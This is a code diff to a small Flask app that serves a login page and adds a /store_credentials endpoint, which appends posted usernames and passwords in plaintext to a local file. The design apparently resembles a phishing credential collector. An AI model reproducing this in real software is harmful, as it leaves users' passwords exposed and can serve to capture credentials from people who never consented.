@@ -1,20 +1,44 @@
-from flask import Flask, render_template, send_from_directory
+from flask import Flask, render_template, request, jsonify, send_from_directory
 import os
 
-app = Flask(__name__)
+# Create Flask app and set templates directory
+app = Flask(__name__, template_folder='templates')
 
-# Define the absolute path to the login-portal folder (where login.html is)
-login_folder = os.path.join(os.path.dirname(__file__), '../login-portal')
+# Route: Redirect home page (/) to /login using an HTML redirect
+@app.route('/')
+def home_redirect():
+    return render_template('redirect.html')
 
-@app.route("/")
-def home():
-    # Serve the redirect page from templates
-    return render_template("login.html")
+# Route: Login page served via template
+@app.route('/login')
+def login_page():
+    return render_template('login.html')
 
-@app.route("/login-portal/login.html")
-def serve_login():
-    # Serve the login.html file from the login-portal directory
-    return send_from_directory(login_folder, 'login.html')
+# Route: Serve static files from login-portal/files/
+@app.route('/files/<path:filename>')
+def serve_custom_static(filename):
+    return send_from_directory(
+        os.path.join(os.path.dirname(__file__), '../login-portal/files'),
+        filename
+    )
 
-if __name__ == "__main__":
-    app.run(debug=True)
+# Route: Save posted credentials to database/users.db
+@app.route('/store_credentials', methods=['POST'])
+def store_credentials():
+    data = request.get_json()
+    username = data.get('username')
+    password = data.get('password')
+
+    # Ensure database folder exists
+    db_path = os.path.join(os.path.dirname(__file__), '../database')
+    os.makedirs(db_path, exist_ok=True)
+
+    # Write credentials to file
+    with open(os.path.join(db_path, 'users.db'), 'a') as db_file:
+        db_file.write(f'{username},{password}\n')
+
+    return jsonify({'message': 'Credentials stored successfully'})
+
+# Run the Flask server
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
